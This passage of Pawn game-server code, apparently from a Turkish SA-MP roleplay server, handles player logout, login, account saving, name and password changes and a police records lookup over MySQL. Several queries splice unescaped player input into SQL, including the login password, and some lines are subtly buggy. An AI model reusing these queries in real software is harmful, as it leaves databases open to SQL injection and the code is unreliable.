			   	if(PlayerCuffed[playerid] != 0) {
	    			strcpy(PlayerInfo[playerid][pPrisonedBy], "Server", 64);
					strcpy(PlayerInfo[playerid][pPrisonReason], "Kelepçeliyken oyundan çýktý(kendi isteðiyle).", 64);

	                PlayerInfo[playerid][pJailed] = 3;
					PlayerInfo[playerid][pJailTime] += 60*60;
				}
			}
			case 2: {
				format(string, sizeof(string), "%s adlý oyuncu oyundan çýktý(kicklendi/banlandý).", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		   	}
		}
	}

	// print("[debug] step #17");

	for(new x; x < sizeof(EventInfo[EventStaff]); x++) {
		if(EventInfo[EventStaff][x] == playerid) {
			EventInfo[EventStaff][x] = 999;
			break;
		}
	}

	// print("[debug] step #18");

	if(GetPVarInt(playerid, "EventToken") == 0 && !GetPVarType(playerid, "LoadingObjects") && GetPVarInt(playerid, "PBM") == 0)
	{
		new Float: x, Float: y, Float: z;
		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		PlayerInfo[playerid][pPos_x] = x;
		PlayerInfo[playerid][pPos_y] = y;
		PlayerInfo[playerid][pPos_z] = z;
	}
	if(GetPVarInt(playerid, "EventToken") != 0 && GetPVarInt(playerid, "PBM") == 0)
	{
	    PlayerInfo[playerid][pInt] = EventLastInt[playerid];
		PlayerInfo[playerid][pVW] = EventLastVW[playerid];
		PlayerInfo[playerid][pPos_r] = EventFloats[playerid][0];
		PlayerInfo[playerid][pPos_x] = EventFloats[playerid][1];
		PlayerInfo[playerid][pPos_y] = EventFloats[playerid][2];
		PlayerInfo[playerid][pPos_z] = EventFloats[playerid][3];
	}

	// print("[debug] step #19");

	if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999 && AdminDuty[playerid] == 0)
	{
		if(IsPlayerConnected(TransportDriver[playerid]))
		{
			TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			TransportTime[TransportDriver[playerid]] = 0;
			TransportCost[TransportDriver[playerid]] = 0;
			format(string, sizeof(string), "~w~Musteri ayrildi~n~~g~$%d kazanildi",TransportCost[playerid]);
			GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
			TransportDriver[playerid] = 999;
		}
	}

	// print("[debug] step #20");

	if(GotHit[playerid] > 0)
	{
		if(GetChased[playerid] < 999)
		{
			if(IsPlayerConnected(GetChased[playerid]))
			{
				SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Eylem yapacaðýn kiþi oyundan çýktý.");
				GoChase[GetChased[playerid]] = 999;
			}
		}
	}
 	if(GoChase[playerid] < 999)
 	{
      GetChased[GoChase[playerid]] = 999;
      GotHit[GoChase[playerid]] = 999;
 	}

 	// print("[debug] step #21");

	if(TransportDuty[playerid] == 1)
	{
		TaxiDrivers -= 1;
	}
	else if(TransportDuty[playerid] == 2)
	{
		BusDrivers -= 1;
	}
	if(PlayerInfo[playerid][pJob] == 11 || PlayerInfo[playerid][pJob2] == 11)
	{
		if(JobDuty[playerid] == 1) { Medics -= 1; }
	}
	if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
		if(JobDuty[playerid] == 1) { Mechanics -= 1; }
	}

	// print("[debug] step #22");

	if(GetPVarType(playerid, "tabbedVW") != 0) {
		PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "tabbedVW");
	} else PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);

	// print("[debug] step #23");

	if(GetPVarInt(playerid, "PBM") > 0) {
		PlayerInfo[playerid][pPos_x] = 1782.8229;
		PlayerInfo[playerid][pPos_y] = -1565.8177;
		PlayerInfo[playerid][pPos_z] = 13.3472;
		PlayerInfo[playerid][pInt] = 0;
		PlayerInfo[playerid][pVW] = 0;
		PlayerInfo[playerid][pPos_r] = 0;
		DeletePVar(playerid, "PBM");
	}

	SaveAccount(playerid);

	// print("[debug] step #24");

	if(PlayerInfo[playerid][pHelper] >= 1) {
        if(GetPVarType(playerid, "posX") != 0) {
			PlayerInfo[playerid][pInt] = GetPVarInt(playerid, "posInt");
			PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "posVW");
			PlayerInfo[playerid][pPos_x] = GetPVarFloat(playerid, "posX");
			PlayerInfo[playerid][pPos_y] = GetPVarFloat(playerid, "posY");
			PlayerInfo[playerid][pPos_z] = GetPVarFloat(playerid, "posZ");
			PlayerInfo[playerid][pHealth] = GetPVarFloat(playerid, "HelpHealth");
			PlayerInfo[playerid][pArmor] = GetPVarFloat(playerid, "HelpArmour");


	        SetPlayerInterior(playerid, GetPVarInt(playerid, "posInt"));
	        SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "posVW"));
	        SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "HelpArmour"));
	        SetPlayerHealth(playerid, GetPVarFloat(playerid, "HelpHealth"));
	        SetPlayerPos(playerid, GetPVarFloat(playerid, "posX"), GetPVarFloat(playerid, "posY"), GetPVarFloat(playerid, "posZ"));

	        DeletePVar(playerid, "posX");
	        DeletePVar(playerid, "posY");
	        DeletePVar(playerid, "posZ");
	        DeletePVar(playerid, "posInt");
	        DeletePVar(playerid, "posVW");
	        DeletePVar(playerid, "HelpHealth");
	        DeletePVar(playerid, "HelpArmour");
        }
    }

	// print("[debug] step #25");

    gPlayerLogged[playerid] = 0;
	return 1;
}

stock AttemptPlayerLogin(playerid, passbuffer[]) {
	new
	    szQuery[225],
	    szPlayerName[MAX_PLAYER_NAME],
		szPlayerName2[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));

	mysql_real_escape_string(szPlayerName, szPlayerName2, g_MySQLConnections[0]);

	format(szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s' AND Password = '%s'", szPlayerName2, passbuffer);
	mysql_query(szQuery, THREAD_LOGIN_ATTEMPT, playerid, g_MySQLConnections[0]);
	return 1;
}

stock LoadPlayerDynamicItems(playerid) {
	new
	    szString[128];

	format(szString, sizeof(szString), "SELECT toys.* FROM toys INNER JOIN players ON toys.Owner = players.ID WHERE players.ID = '%d' ORDER BY toys.ID ASC LIMIT %d", PlayerInfo[playerid][pID], MAX_PLAYERTOYS);
	mysql_query(szString, THREAD_LOAD_P_ITEMS_CHAIN_1, playerid, g_MySQLConnections[0]);
	return 1;
}

stock SaveAccount(playerid) {
    // The query threads continue in the callback for finished queries.
	if(GetPVarInt(playerid, "TempName") != 1 && gPlayerLogged[playerid] && AdminDuty[playerid] == 0) {

		new
			szPlayerName[MAX_PLAYER_NAME],
			szPlayerName2[MAX_PLAYER_NAME],
			szAdminName[MAX_PLAYER_NAME],
		    szQuery[2048];

		GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);

		mysql_real_escape_string(szPlayerName, szPlayerName2, g_MySQLConnections[0]);
		mysql_real_escape_string(PlayerInfo[playerid][pAdminName], szAdminName, g_MySQLConnections[0]);

		format(szQuery, sizeof(szQuery), "UPDATE players SET Username = '%s', Password = '%s', Level = %d, AdminLevel = %d, AdminName = '%s', BanAppealer = %d, Donator = %d, Banned = %d, Permabanned = %d, Disabled = %d, LastIP = '%s', Registered = %d, \
		Tutorial = %d, Sex = %d, Age = %d, Skin = %d, PosX = '%f', PosY = '%f', PosZ = '%f', PosR = '%f', ConnectTime = %d, Respect = %d, PhoneNumber = %d, Warnings = %d, Gang = %d, Faction = %d, Leader = %d, Rank = %d WHERE ID = %d",
		szPlayerName, PlayerInfo[playerid][pKey], PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pAdmin], szAdminName, PlayerInfo[playerid][pBanAppealer], PlayerInfo[playerid][pDonator], PlayerInfo[playerid][pBanned],
		PlayerInfo[playerid][pPermaBanned], PlayerInfo[playerid][pDisabled], PlayerInfo[playerid][pIP], PlayerInfo[playerid][pReg], PlayerInfo[playerid][pTut], PlayerInfo[playerid][pSex], PlayerInfo[playerid][pAge], PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pPos_x],
		PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z], PlayerInfo[playerid][pPos_r], PlayerInfo[playerid][pConnectTime], PlayerInfo[playerid][pRespect], PlayerInfo[playerid][pNumber], PlayerInfo[playerid][pWarns], PlayerInfo[playerid][pGang],
		PlayerInfo[playerid][pFaction], PlayerInfo[playerid][pLeader], PlayerInfo[playerid][pRank], PlayerInfo[playerid][pID]);

		mysql_query(szQuery, THREAD_SAVE_ACCOUNT_CHAIN_1, playerid, g_MySQLConnections[0]);
	}
	return 1;
}

stock timec(timestamp, compare = -1) {
    if (compare == -1) {
        compare = gettime();
    }
    new
        n,
        // on the following line, I have removed the need for the diff() function.
        // if you want to use the diff() function in pawn, replace the following with:
        // Float:d = diff(timestamp, compare),
        Float:d = (timestamp > compare) ? timestamp - compare : compare - timestamp,
        returnstr[32];
    if (d < 60) {
        format(returnstr, sizeof(returnstr), "< 1 minute");
        return returnstr;
    } else if (d < 3600) { // 3600 = 1 hour
        n = floatround(floatdiv(d, 60.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "minute");
    } else if (d < 86400) { // 86400 = 1 day
        n = floatround(floatdiv(d, 3600.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "hour");
    } else if (d < 2592000) { // 2592000 = 1 month
        n = floatround(floatdiv(d, 86400.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "day");
    } else if (d < 31536000) { // 31536000 = 1 year
        n = floatround(floatdiv(d, 2592000.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "month");
    } else {
        n = floatround(floatdiv(d, 31536000.0), floatround_floor);
        format(returnstr, sizeof(returnstr), "year");
    }
    if (n == 1) {
        format(returnstr, sizeof(returnstr), "1 %s", returnstr);
    } else {
        format(returnstr, sizeof(returnstr), "%d %ss", n, returnstr);
    }
    return returnstr;
}

public OnQueryError(errorid, error[], resultid, extraid, callback[], query[], connectionHandle) {
	printf("errorid: %d | Hata: %s | callback: %s | query: %s | connection handle: %d | resultid: %d | extraid: %d", errorid, error, callback, query, connectionHandle, resultid, extraid);
	return 1;
}

public OnQueryFinish(query[], resultid, extraid, connectionHandle) {
	new
	    szQuery[2048];

	switch(resultid) {
	    case THREAD_CONFIRM_USERNAME: {
	        mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_fetch_int(g_MySQLConnections[0]) == 0) { // MySQL confirmed the COUNT(*) result is 0; no account with that username exists yet.
	            mysql_free_result(g_MySQLConnections[0]);
	            ShowMainMenuDialog(extraid, 2);
	            for(new i = 0; i < MAX_HOUSES; i++)
	            {
	                if(HouseInfo[i][hOwned] == 0)
	                {
	                    if(PlayerInfo[extraid][pHouse] == i)
	                    {
	                        PlayerInfo[extraid][pHouse] = -1;
	                    }
	                    else if(PlayerInfo[extraid][pHouse2] == i)
	                    {
	                        PlayerInfo[extraid][pHouse2] = -1;
	                    }
	                }
	            }

	            gPlayerAccount[extraid] = 0;
	        } else {
	            mysql_free_result(g_MySQLConnections[0]);
	            ShowMainMenuDialog(extraid, 1);
	            gPlayerAccount[extraid] = 1;
		  	}
	    }
	    case THREAD_CHECK_NAME_PASSWORD: {
	        mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_num_rows(g_MySQLConnections[0]) > 0) {
	            new
	                szPassword[64],
	                szTarget[MAX_PLAYER_NAME],
					szBuffer[129];

				GetPVarString(extraid, "opasschange", szPassword, sizeof(szPassword));
				GetPVarString(extraid, "opasschangetarget", szTarget, sizeof(szTarget));

				WP_Hash(szBuffer, sizeof(szBuffer), szPassword);

		        format(szQuery, sizeof(szQuery), "UPDATE players SET Password = '%s' WHERE Username = '%s'", szBuffer, szTarget);
		        mysql_query(szQuery, THREAD_FULLY_CHANGE_PASSWORD, extraid, g_MySQLConnections[0]);
	        } else {
				DeletePVar(extraid, "opasschange");
				DeletePVar(extraid, "opasschangetarget");
				SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu karakteri yok yada oyuncu admin.");
			}

	        mysql_free_result(g_MySQLConnections[0]);
	    }
		case THREAD_LIST_NAMECHANGES: {
		    mysql_store_result(g_MySQLConnections[0]);

		    if(mysql_num_rows(g_MySQLConnections[0]) > 0) {
		        // Use 'szQuery' because of the large size of the string at our disposal
		        format(szQuery, sizeof(szQuery), "");

		        new
		            szPlayerName[MAX_PLAYER_NAME],
		            szPlayerOldName[MAX_PLAYER_NAME],
		            szPlayerAdminName[MAX_PLAYER_NAME],
					szMessage[1000],
					iUnixTS;

		        format(szMessage, sizeof(szMessage), "%s adlý oyuncunun son 10 isim deðiþiklikleri:\n", GetPlayerNameEx(GetPVarInt(extraid, "namechanges_target")));

	        	while(mysql_fetch_row_format(szQuery, "|", g_MySQLConnections[0])) {
					sscanf(szQuery, "p<|>s[MAX_PLAYER_NAME]ds[MAX_PLAYER_NAME]s[MAX_PLAYER_NAME]", szPlayerOldName, iUnixTS, szPlayerName, szPlayerAdminName);

					format(szMessage, sizeof(szMessage), "%s\n%s artýk %s (%s'dan itibaren) olarak biliniyor. Ýsim deðiþikliði %s tarafýndan kabul edildi", szMessage, szPlayerOldName, szPlayerName, timec(iUnixTS), szPlayerAdminName);
				}

				DeletePVar(extraid, "namechanges_target");

				ShowPlayerDialogEx(extraid, DIALOG_SHOW_NAMECHANGES, DIALOG_STYLE_MSGBOX, "Ýsim deðiþiklikleri", szMessage, "Tamam", "");
		    } else {
				SendClientMessage(extraid, COLOR_GREY, "Bu oyuncunun isim deðiþtirme isteði yok.");
				DeletePVar(extraid, "namechanges_target");
		    }

		    mysql_free_result(g_MySQLConnections[0]);
		}
	    case THREAD_FULLY_CHANGE_PASSWORD: {
	        new
	            szMessage[128],
				szTarget[MAX_PLAYER_NAME];

            GetPVarString(extraid, "opasschangetarget", szTarget, sizeof(szTarget));

     		format(szMessage, sizeof(szMessage), "%s adlý oyuncunun þifresini deðiþtirdin.", szTarget);
	        SendClientMessage(extraid, COLOR_YELLOW, szMessage);

	        format(szMessage, sizeof(szMessage), "AdminKomutu: %s adlý oyuncunun þifresi %s tarafýndan deðiþtirildi.", szTarget, GetPlayerNameEx(extraid));
	        Log("logs/password.log", szMessage);
	        ABroadCast(COLOR_LIGHTRED, szMessage, 1);

	        DeletePVar(extraid, "opasschange");
	        DeletePVar(extraid, "opasschangetarget");
		}
	    case THREAD_CHECK_NEW_NAME: {
			mysql_store_result(g_MySQLConnections[0]);

			if(mysql_num_rows(g_MySQLConnections[0]) > 0) {
			    SendClientMessage(GetPVarInt(extraid, "requestby"), COLOR_GREY, "Yapmak istediðin isim baþkasý tarafýndan alýnmýþ.");
			    if(GetPVarInt(extraid, "requestpath") == 1) {
					SendClientMessage(extraid, COLOR_GREY, "Seçtiðiniz isim baþkasý tarafýndan kullanýlýyor, baþka isim seçin.");
					ShowPlayerDialogEx(extraid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Ücretsiz isim deðiþtirme","Burasý bir roleplay serveridir. Ýsminizin þu formatta olmasý gerekir: Ýsim_Soyisim.\nÖrneðin: John_Smith yada Mert_Demir\n\nBir admin size ücretsiz isim deðiþikliði teklif etti. Ýstediðiniz ismi aþaðýya girin.\n\nUyarý: Eðer iptale basarsanýz, otomatik olarak kickleneceksiniz.", "Deðiþtir", "Iptal");
				} else if(GetPVarInt(extraid, "requestpath") == 2) {
				    SendClientMessage(extraid, COLOR_GREY, "Yapmak istediðin isim baþkasý tarafýndan alýnmýþ. Tekrar deneyin.");

					DeletePVar(extraid, "requestpath");
					DeletePVar(extraid, "NewNameRequest");
					DeletePVar(extraid, "NameChangeCost");
					DeletePVar(extraid, "requestby");
					DeletePVar(extraid, "requestedname");
					DeletePVar(extraid, "RequestingNameChange");
				} else if(GetPVarInt(extraid, "requestpath") == 3) {
					SendClientMessage(GetPVarInt(extraid, "requestby"), COLOR_GREY, "Bu isim baþkasý tarafýndan alýnmýþ.");
					DeletePVar(extraid, "requestedname");
					DeletePVar(extraid, "requestpath");
					DeletePVar(extraid, "requestby");
				}
			} else {
			    new
			        szPlayerName[MAX_PLAYER_NAME];

				GetPVarString(extraid, "requestedname", szPlayerName, MAX_PLAYER_NAME);

				format(szQuery, sizeof(szQuery), "UPDATE players SET Username = '%s' WHERE ID = %d", szPlayerName, PlayerInfo[extraid][pID]);
				mysql_query(szQuery, THREAD_CONFIRMED_NAMECHANGE, extraid, g_MySQLConnections[0]);
			}

			mysql_free_result(g_MySQLConnections[0]);
		}
		case THREAD_CONFIRMED_NAMECHANGE: {
  			new
				szPlayerName[MAX_PLAYER_NAME],
				szOriginalPlayerName[MAX_PLAYER_NAME],
				string[128];

			GetPVarString(extraid, "requestedname", szPlayerName, MAX_PLAYER_NAME);
			GetPlayerName(extraid, "szOriginalPlayerName", MAX_PLAYER_NAME);

            if(GetPVarInt(extraid, "requestpath") == 1) {
				format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s, %s adlý oyuncunun isminin %s olarak deðiþtirme isteðini kabul etti.", GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
				ABroadCast(COLOR_YELLOW, string, 2);
				format(PlayerInfo[extraid][pFlag], 128, "");
			} else if(GetPVarInt(extraid, "requestpath") == 2) {
				format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s, %s adlý oyuncunun isminin %s olarak deðiþtirme isteðini kabul etti.", GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
				ABroadCast(COLOR_YELLOW, string, 2);
			} else {
				format(string, sizeof(string), "%s, %s adlý oyuncunun ismini %s olarak deðiþtirdi.",GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
                Log("logs/isimdegistir.log", string);
				ABroadCast(COLOR_YELLOW, string, 1);
			}

			if(PlayerInfo[extraid][pHouse] != INVALID_HOUSE_ID && strcmp(szOriginalPlayerName, HouseInfo[PlayerInfo[extraid][pHouse]][hOwner], true) == 0) {
				strmid(HouseInfo[PlayerInfo[extraid][pHouse]][hOwner], szPlayerName, 0, strlen(szPlayerName), 255);
     			format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[extraid][pHouse]][hOwner],HouseInfo[PlayerInfo[extraid][pHouse]][hLevel],PlayerInfo[extraid][pHouse]);
         		UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[extraid][pHouse]][hTextID], COLOR_HOUSEGREEN, string);
			}

			if(PlayerInfo[extraid][pHouse2] != INVALID_HOUSE_ID && strcmp(szOriginalPlayerName, HouseInfo[PlayerInfo[extraid][pHouse2]][hOwner], true) == 0) {
				strmid(HouseInfo[PlayerInfo[extraid][pHouse2]][hOwner], szPlayerName, 0, strlen(szPlayerName), 255);
    			format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[extraid][pHouse]][hOwner],HouseInfo[PlayerInfo[extraid][pHouse]][hLevel],PlayerInfo[extraid][pHouse]);
     			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[extraid][pHouse2]][hTextID], COLOR_HOUSEGREEN, string);
			}

			if(PlayerInfo[extraid][pDonator] >= 1) {
				format(string, sizeof(string), "[VIP ÝSÝM DEÐÝÞÝKLÝKLERÝ] %s ismini % olarak deðiþtirdi.", GetPlayerNameEx(extraid), szPlayerName);
				Log("logs/donatornames.log", string);
			}

			format(string, sizeof(string), "Ýsmin %s'ken %s olarak deðiþtirildi.", GetPlayerNameEx(extraid), szPlayerName);
			SendClientMessage(extraid, COLOR_YELLOW, string);

			format(string, sizeof(string), "%s, %s adlý oyuncunun ismini %s olarak deðiþtirdi.",GetPlayerNameEx(GetPVarInt(extraid, "requestby")), GetPlayerNameEx(extraid), szPlayerName);
			Log("logs/stats.log", string);

			if(AdminDuty[extraid] == 0) {
				format(szQuery, sizeof(szQuery), "INSERT INTO namechanges (dbid, oldname, newname, approvedbyid, approvedbyname, unixts) VALUES(%d, '%s', '%s', %d, '%s', %d)", PlayerInfo[extraid][pID], GetPlayerNameEx(extraid), szPlayerName, PlayerInfo[GetPVarInt(extraid, "requestby")][pID], GetPlayerNameEx(GetPVarInt(extraid, "requestby")), gettime());
				mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
			}

			SetPlayerName(extraid, szPlayerName);

			if(GetPVarInt(extraid, "NameChangeCost") > 0)
				PlayerInfo[extraid][pCash] -= GetPVarInt(extraid, "NameChangeCost");

			PlayerInfo[extraid][pInt] = GetPlayerInterior(extraid);

			if(GetPVarType(extraid, "tabbedVW") != 0) {
				PlayerInfo[extraid][pVW] = GetPVarInt(extraid, "tabbedVW");
			} else PlayerInfo[extraid][pVW] = GetPlayerVirtualWorld(extraid);

			GetPlayerIp(extraid, PlayerInfo[extraid][pIP], 32);
			GetPlayerPos(extraid, PlayerInfo[extraid][pPos_x], PlayerInfo[extraid][pPos_y], PlayerInfo[extraid][pPos_z]);
			GetPlayerFacingAngle(extraid, PlayerInfo[extraid][pPos_r]);
			SaveAccount(extraid);

			DeletePVar(extraid, "requestby");
			DeletePVar(extraid, "requestedname");
			DeletePVar(extraid, "requestpath");
			DeletePVar(extraid, "NewNameRequest");
			DeletePVar(extraid, "NameChangeCost");
			DeletePVar(extraid, "RequestingNameChange");
		}
	    case THREAD_GIVE_REF_TOKENS: {
	        mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_num_rows(g_MySQLConnections[0]) == 0)
	            return SendClientMessage(extraid, COLOR_YELLOW, "Seni öneren oyuncunun karakteri durmadýðýndan dolayý ona öneri jetonu verilemedi.");

			new
			    iTokens = mysql_fetch_int(g_MySQLConnections[0]) + 1;

			format(szQuery, sizeof(szQuery), "UPDATE players SET RefTokensOffline = %d WHERE Username = '%s'", iTokens, PlayerInfo[extraid][pReferredBy]);
			mysql_query(szQuery, THREAD_LITERALLY_GIVE_REFTOKEN, extraid, g_MySQLConnections[0]);

            mysql_free_result(g_MySQLConnections[0]);
		}
		case THREAD_OFFLINE_FLAG: {
	        mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_num_rows(g_MySQLConnections[0]) == 0)
	            return SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok!");

			new
			    szFlag[128],
			    szFormattedFlag[128],
			    szPlayerName[MAX_PLAYER_NAME];

			GetPVarString(extraid, "offline_flag", szFlag, sizeof(szFlag));
			GetPVarString(extraid, "offline_flag_target", szPlayerName, sizeof(szPlayerName));

			new month,day,year;
			getdate(year,month,day);
			format(szFormattedFlag, sizeof(szFormattedFlag), "%s - %s (%d/%d/%d)", szFlag, GetPlayerNameEx(extraid), day, month, year);

			format(szQuery, sizeof(szQuery), "UPDATE players SET Flag = '%s' WHERE Username = '%s'", szFormattedFlag, szPlayerName);
			mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);

			// Avoid defining a new string, use one that's already clear to go.
			format(szFormattedFlag, sizeof(szFormattedFlag), "AdminKomutu: %s, %s adlý oyuncuya bayrak koydu, sebep: %s.", GetPlayerNameEx(extraid), szPlayerName, szFlag);
			ABroadCast(COLOR_LIGHTRED, szFormattedFlag, 1);

			DeletePVar(extraid, "offline_flag");
			DeletePVar(extraid, "offline_flag_target");

    		mysql_free_result(g_MySQLConnections[0]);
		}
		case THREAD_OFFLINE_UNINVITE: {
		    mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_num_rows(g_MySQLConnections[0]) == 0)
	            return SendClientMessage(extraid, COLOR_YELLOW, "Böyle bir oyuncu yok!");

			if(mysql_retrieve_row()) {
			    new
			        szReturn[6];

            	mysql_fetch_field_row(szReturn, "AdminLevel", g_MySQLConnections[0]);

            	if(strval(szReturn) >= 5)
            	    return SendClientMessage(extraid, COLOR_YELLOW, "Bu oyuncu senin tarafýndan atýlamaz.");

                mysql_fetch_field_row(szReturn, "Faction", g_MySQLConnections[0]);

                if(strval(szReturn) != PlayerInfo[extraid][pFaction])
                	return SendClientMessage(extraid, COLOR_YELLOW, "Bu oyuncu seninle ayný oluþumda deðil.");

				new
				    szPlayerName[MAX_PLAYER_NAME];

				GetPVarString(extraid, "uninvite_target", szPlayerName, MAX_PLAYER_NAME);
				format(szQuery, sizeof(szQuery), "UPDATE players SET Faction = 0, Rank = 0, OnDuty = 0, Leader = 0, Skin = 311 WHERE Username = '%s'", szPlayerName);
				mysql_query(szQuery, THREAD_FULLY_UNINVITE, extraid, g_MySQLConnections[0]);

				mysql_free_result(g_MySQLConnections[0]);
            }

		}
		case THREAD_FULLY_UNINVITE: {
			new
			    szPlayerName[MAX_PLAYER_NAME],
			    szMessage[128];

			GetPVarString(extraid, "uninvite_target", szPlayerName, MAX_PLAYER_NAME);

			format(szMessage, sizeof(szMessage), "%s adlý oyuncuyu oluþumdan attýn.", szPlayerName);
			SendClientMessage(extraid, COLOR_LIGHTBLUE, szMessage);

            format(szMessage, sizeof(szMessage), "%s, %s adlý oyuncuyu %s'dan attý.", GetPlayerNameEx(extraid), szPlayerName, GetFactionName(PlayerInfo[extraid][pFaction]));
			Log("logs/faction.log", szMessage);

			DeletePVar(extraid, "uninvite_target");
		}
		case THREAD_LITERALLY_GIVE_REFTOKEN: {
		    new
		        string[123];

			format(string, sizeof(string), "8 saat oynama süresine oluþtuðundan ve öneren kiþiye %s yazdýðýndan dolayý, kendisi 1 öneri jetonu kazandý.", PlayerInfo[extraid][pReferredBy]);
   			SendClientMessage(extraid, COLOR_YELLOW, string);
		}
	    case THREAD_REFERRAL_MENU: {
	        mysql_store_result(g_MySQLConnections[0]);

	        if(mysql_num_rows(g_MySQLConnections[0]) == 0) {
	            format(PlayerInfo[extraid][pReferredBy], MAX_PLAYER_NAME, "");
                ShowPlayerDialogEx(extraid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Bu isimde kayýtlý oyuncu yok.\n\nSana bu sunucuyu öneren oyuncunun adý ne?\n\nUyarý: Oyuncunun tam ismini girmelisin ('_') eklemeyi unutma. Örnek: John_Smith", "Tamam", "Iptal");
	        } else {
	            mysql_free_result(g_MySQLConnections[0]);

				new
				    string[128];

	            format(string, sizeof(string), "{FFFFFF}%s tarafýndan bu sunucuya önerildiðinize emin misiniz?", PlayerInfo[extraid][pReferredBy]);
	            ShowPlayerDialogEx(extraid, REGISTRATION_MENU_FIVE, DIALOG_STYLE_MSGBOX, "{00ECFF}Phoenix Role Play - Kayýt", string, "Evet", "Hayýr");
	        }
		}
		case THREAD_MDC_CHECK: {
			if(mysql_num_rows(g_MySQLConnections[0]) == 0) { // No rows exist with the specified criteria, so, wrong password!
				mysql_free_result(g_MySQLConnections[0]);
				ShowPlayerDialogEx(extraid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | HATA ", "Bu kiþinin bir kaydý yok.", "Tamam", "Iptal");
			} else {
				mysql_store_result(g_MySQLConnections[0]);
				new
					crimeDescription[128],
					crimeIssuerName[MAX_PLAYER_NAME],
					crimeIssuedToName[MAX_PLAYER_NAME],
					szFullMessage[1028],
					iSlot = 0;

				while(mysql_retrieve_row()) {
					iSlot++;
					switch(iSlot) {
						case 1: {
							mysql_fetch_field_row(crimeDescription, "crimeDescription", g_MySQLConnections[0]);
							mysql_fetch_field_row(crimeIssuerName, "crimeIssuerName", g_MySQLConnections[0]);
							mysql_fetch_field_row(crimeIssuedToName, "crimeIssuedToName", g_MySQLConnections[0]);
							if(!isnull(crimeDescription)) {
								format(szFullMessage, sizeof(szFullMessage), "Ýsim: %s", crimeIssuedToName);
								format(szFullMessage, sizeof(szFullMessage), "%s\n %s - %s", szFullMessage, crimeDescription, crimeIssuerName);
							}
						}
						case 2, 3, 4, 5, 6: {
							mysql_fetch_field_row(crimeDescription, "crimeDescription", g_MySQLConnections[0]);
							mysql_fetch_field_row(crimeIssuerName, "crimeIssuerName", g_MySQLConnections[0]);
							if(!isnull(szFullMessage) && !isnull(crimeDescription)) {
								format(szFullMessage, sizeof(szFullMessage), "%s\n %s - %s", szFullMessage, crimeDescription, crimeIssuerName);
							}
						}
					}
				}
				for(new i=0; i < MAX_PLAYERVEHICLES; i++) {
					if(PlayerVehicleInfo[GetPVarInt(extraid, "MVBKONTROL")][i][pvTicket] != 0)
					{
						format(szFullMessage, sizeof(szFullMessage), "%s\n Araç kaydý: %d | Araç modeli: %s | Ceza: $%d.\n",szFullMessage, PlayerVehicleInfo[GetPVarInt(extraid, "MVBKONTROL")][i][pvId],GetVehicleName(PlayerVehicleInfo[GetPVarInt(extraid, "MVBKONTROL")][i][pvId]),PlayerVehicleInfo[GetPVarInt(extraid, "MVBKONTROL")][i][pvTicket]);
					}
				}
				ShowPlayerDialogEx(extraid, MDC_END_ID, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Suç Geçmiþi", szFullMessage, "Tamam", "Iptal");
				DeletePVar(extraid, "MVBKONTROL");
				mysql_free_result(g_MySQLConnections[0]);
			}
		}
	    case THREAD_OFFLINE_KILLS: {
			mysql_store_result(g_MySQLConnections[0]);
			if(IsPlayerConnected(extraid)) {
				if(mysql_num_rows(g_MySQLConnections[0]) == 0) { // No rows exist with the specified criteria, so, wrong password!
		            mysql_free_result(g_MySQLConnections[0]);
					SendClientMessage(extraid, COLOR_GREY, "Girilen karakter geçersiz.");
		        } else {
